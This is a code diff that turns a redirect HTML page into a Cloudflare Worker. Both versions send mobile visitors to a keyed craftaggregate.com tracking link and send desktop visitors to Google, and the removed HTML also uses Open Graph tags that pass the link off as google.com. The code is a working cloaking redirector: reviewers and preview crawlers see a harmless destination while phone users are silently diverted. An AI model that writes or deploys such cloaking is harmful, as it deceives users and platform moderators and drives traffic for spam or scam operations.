@@ -1,29 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+export default {
+  async fetch(request, env) {
+    const url = new URL(request.url);
+    const userAgent = request.headers.get("user-agent") || "";
 
-    <meta property="og:title" content="">
-    <meta property="og:description" content="">
-    <meta property="og:image" content="https://raw.githubusercontent.com/awbhund-art/fafv/refs/heads/main/7981647689944298232.jpg">
-    <meta property="og:url" content="https://www.google.com">
-    <meta property="og:type" content="website">
+    // 1. Check karein ke user mobile device se hai ya nahi (Regex matching)
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
-    <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        var screenWidth = window.innerWidth;
+    // 2. Cloudflare ke provide kiye gaye device detection header ka fallback use karein
+    const isMobileDevice = isMobile || request.cf?.deviceType === "mobile";
 
-        if (isMobile || screenWidth <= 768) {
-            window.location.href = "https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72";
-        } else {
-            window.location.href = "https://www.google.com/";
-        }
-    });
-    </script>
-</head>
-<body>
-</body>
-</html>
+    // 3. Agar mobile device match ho jaye toh target URL par send karein
+    if (isMobileDevice) {
+      return Response.redirect("https://craftaggregate.com/rt3n5dq7?key=0e5612fb5799030a29df1325d1189b72", 302);
+    }
+
+    // 4. Desktop users ke liye Google par redirect karein (Ya jo bhi aapka default URL ho)
+    return Response.redirect("https://www.google.com/", 302);
+  },
+};
